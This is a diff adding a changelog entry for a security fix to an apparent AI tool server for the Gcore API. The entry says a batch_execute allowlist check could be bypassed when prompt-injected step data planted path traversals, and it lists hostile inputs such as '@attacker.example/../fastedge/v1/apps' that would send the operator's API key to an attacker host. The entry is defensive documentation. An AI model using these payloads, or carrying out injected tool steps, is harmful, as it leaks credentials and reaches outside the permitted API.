@@ -14,6 +14,30 @@ See `SEARCH_GUIDE.md` for more search patterns.
 
 ---
 
+## [2026-08-25] - security: batch_execute policy bypass via resolved paths (ICM-50568)
+
+External report: `batch_execute` ran `checkAllowed` on the **template** path (where `$name.field` is one opaque segment, so `/fastedge/v1/apps/$planted.v` matched `/fastedge/v1/apps/{app_id}`), then dispatched the **resolved** path with no second check. A prior step's data is untrusted (prompt injection, or just an API response containing free text), so `$planted.v = "../../../cdn/resources/123"` produced a request `new URL()` normalized to `/cdn/resources/123` — outside the allowlist, sent with the operator's `GCORE_API_KEY`.
+
+**Fix — three parts**. The invariant: *the pathname the policy validates must equal the pathname `fetch()` requests, on the configured origin.*
+
+- `src/policy/enforce.ts` — new exported `normalizePath()`, used by `matchTemplate` (so `gcore_api` and workflow validation get it too). Canonicalizes to the URL parser's own view rather than string-matching: strips TAB/LF/CR **first** (WHATWG removes them anywhere in the input) and runs every check on the cleaned string, then lets `new URL(cleaned, "http://policy.invalid")` split the query/fragment and collapse `.`/`..`. Returns `null` (→ denial) for: any remaining control char; anything not starting with exactly one `/`; backslashes; `%2e`/`%2f` in the resulting pathname.
+- `src/api-client.ts` — choke-point guard in `callGcoreApi`: builds the URL in a try/catch and refuses (status 0 + error) when `url.origin !== new URL(GCORE_API_BASE).origin`, before any `fetch`. Independent of the policy layer, so it covers every caller.
+- `src/tools/api/batch-execute.ts` — after `resolveRefs`, re-run `checkAllowed` on the concrete path before dispatch. Denial aborts the batch with the same payload shape as a pre-flight denial — `policy_denied` + a `denied_steps` array (one entry, with `template_path` and `resolved_path` added alongside `path`) + `completed`. Segment-count matching in `matchTemplate` means an injected `/` also fails the re-check, so no separate `/`-rejection is needed.
+
+**Why the extra two parts** — Codex (MoM) review of the first draft found that normalizing alone *introduced* a worse bug and left two divergences:
+
+- `@attacker.example/../fastedge/v1/apps` normalized to the allowed `/fastedge/v1/apps`, but `new URL("https://api.gcore.com" + p)` parses `api.gcore.com` as **userinfo** — the request, with the operator's `GCORE_API_KEY`, would have gone to `attacker.example`. (The pre-fix raw-string match rejected this by accident.)
+- `..%<LF>2f..` dodged the `%2f` check because the parser strips LF *after* a regex sees the raw string.
+- `/<LF>/attacker.example/x` passed a leading-slash check on the raw input, then cleaned into a protocol-relative `//attacker.example/x`.
+
+Verified by diffing `normalizePath(p)` against `new URL(GCORE_API_BASE + p).pathname` over 29 hostile inputs: zero divergence on anything the policy accepts, and all 194 `ALLOWED_OPS` still reachable with ordinary params (the new strictness denies nothing legitimate).
+
+**Not changed** (reviewed, deliberate): resolved query/body values in a batch are not policy-checked — the allowlist is keyed on method + path, and query values go through `url.searchParams.set()`, so they cannot alter the pathname. `GCORE_API_BASE` with a trailing slash or path prefix concatenates oddly; pre-existing and unrelated.
+
+**Tests** (`scripts/tests/test-api.ts`): the reported chain (step 1 plants the traversal, step 2 interpolates it) denies and never dispatches; authority-manipulating paths; control-char divergences; the origin guard. 78 API tests passing.
+
+---
+
 ## [2026-05-11] - fix: gcore_api body serialization (finding #23)
 
 POST/PATCH calls through `gcore_api` consistently failed with the FastEdge gateway returning `400 — request body has an error: ... value must be an object`, even when the body was structurally well-formed JSON. Reproduced 3× during the 2026-05-08 `geo-redirect` live-test run; `batch_execute` succeeded with the identical body shape, confirming the bug was specific to `gcore_api`'s wire path.
